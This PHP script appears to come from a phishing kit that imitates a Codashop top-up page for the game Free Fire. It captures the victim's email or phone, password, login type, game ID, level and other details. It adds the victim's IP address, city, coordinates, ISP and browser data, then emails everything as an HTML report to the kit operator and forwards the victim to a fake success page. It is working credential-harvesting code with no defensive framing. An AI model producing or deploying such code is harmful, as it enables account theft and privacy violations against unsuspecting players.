<?php 
// MENGAMBIL KONTROL
include 'API-AlexHosting.net/bendera.php';
include 'API-AlexHosting.net/UserAgent.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$nickname = $_POST['nickname'];
$playid = $_POST['playid'];
$elitepass = $_POST['elitepass'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$phone = $_POST['phone'];

$benua = $renzhosting['continent'];
$negara = $renzhosting['country'];
$region = $renzhosting['regionName'];
$city = $renzhosting['city'];
$latitude = $renzhosting['lat'];
$longtitude = $renzhosting['lon'];
$timezone = $renzhosting['timezone'];
$perdana = $renzhosting['isp'];
$ipaddress = $renzhosting['query'];
$platform = $infos['platfrm_name'];
$osversi = $infos['platfrm_vers'];
$browser = $infos['browser_name'];
//MENGAMBIL GET IP REAL KE DATA RESULT
include 'API-AlexHosting.net/daerah.php';
include 'API-AlexHosting.net/AlexhostX.php';

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $nickname == "" && $playid == "" && $login == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
       $subjek = "$benderarenz | CODASHOP PUNYA SI -> [ $nickname ]";
       $pesan = '
       <center>
        <div style="background: url(https://f.top4top.io/p_21969kokc0.png) no-repeat;border:2px solid red;background-size: 100% 100%; width: 294; height: 101px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
       </div>
        <table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid red; border-collapse:collapse;width:100%;background:#2F4F4F;">
           <tr>
       <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Email/Telpon</b></th>
       <th style="padding:3px;width: 65%; text-align: center;"><b>'.$email.'</th> 
       </tr>
       <tr>
       <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Password</th>
       <th style="padding:3px;width: 65%; text-align: center;"><b>'.$password.'</th> 
       </tr>
       <tr>
       <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Login</th>
       <th style="padding:3px;width: 65%; text-align: center;"><b>'.$login.'</th> 
       </tr>
       <tr>
       <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Nickname</th>
       <th style="padding:3px;width: 65%; text-align: center;"><b>'.$nickname.'</th> 
       </tr>
       <tr>
       <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>ID Game</th>
       <th style="padding:3px;width: 65%; text-align: center;"><b>'.$playid.'</th> 
       </tr>
       <tr>
       <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Level</th>
       <th style="padding:3px;width: 65%; text-align: center;"><b>'.$level.'</th> 
       </tr>
       <tr>
       <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Elitepass</th>
       <th style="padding:3px;width: 65%; text-align: center;"><b>'.$elitepass.'</th> 
       </tr>
       <tr>
       <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Tier</th>
       <th style="padding:3px;width: 65%; text-align: center;"><b>'.$tier.'</th> 
       </tr>
       <tr>
       <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Phone</th>
       <th style="padding:3px;width: 65%; text-align: center;"><b>'.$phone.'</th> 
       </tr>
       <tr>
       <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Negara</th>
       <th style="padding:3px;width: 65%; text-align: center;"><b>'.$negara.'</th> 
       </tr>
       <tr>
       <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Kota</th>
       <th style="padding:3px;width: 65%; text-align: center;"><b>'.$city.'</th> 
       </tr>
       <tr>
       <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Latitude</th>
       <th style="padding:3px;width: 65%; text-align: center;"><b>'.$latitude.'</th> 
       </tr>
       <tr>
       <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Longitude</th>
       <th style="padding:3px;width: 65%; text-align: center;"><b>'.$longtitude.'</th> 
       </tr>
       <tr>
       <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Zona Waktu</th>
       <th style="padding:3px;width: 65%; text-align: center;"><b>'.$timezone.'</th> 
       </tr>
       <tr>
       <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Perdana</th>
       <th style="padding:3px;width: 65%; text-align: center;"><b>'.$perdana.'</th> 
       </tr>
       <tr>
       <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>IP Address</th>
       <th style="padding:3px;width: 65%; text-align: center;"><b>'.$ipaddress.'</th> 
       </tr>
       <tr>
       <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Platform</th>
       <th style="padding:3px;width: 65%; text-align: center;"><b>'.$platform.'</th> 
       </tr>
       <tr>
       <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Os</th>
       <th style="padding:3px;width: 65%; text-align: center;"><b>'.$osversi.'</th> 
       </tr>
       <tr>
       <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Browser</th>
       <th style="padding:3px;width: 65%; text-align: center;"><b>'.$browser.'</th> 
       </tr>
       </table>
       <div style="border:2px solid red;width: 294; font-weight:bold; height: 20px; background: #2F4F4F; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">
    
       <a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#25D366;" href="https://wa.me/6285771900076">𝚆𝚑𝚊𝚝𝚜𝚊𝚙𝚙</a>
       </div>
        <center>
       ';
include 'email.php';
$sender ='From: CODASHOP FF <admin@alexhost.my.id>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($renzxhosting, $subjek, $pesan, $headers);

// MENDAPATKAN DATA YANG DI-INPUT DAN MENGALIHKAN KE HALAMAN COMPLETED
if($kirim) {
echo "<form id='$renzhosting' method='POST' action='id/free-fire/success.php'>
<input type='hidden' name='email' value='$email'>
</form>
<script type='text/javascript'>document.getElementById('Jangan Hapus Copyright').submit();</script>";
}
}
?>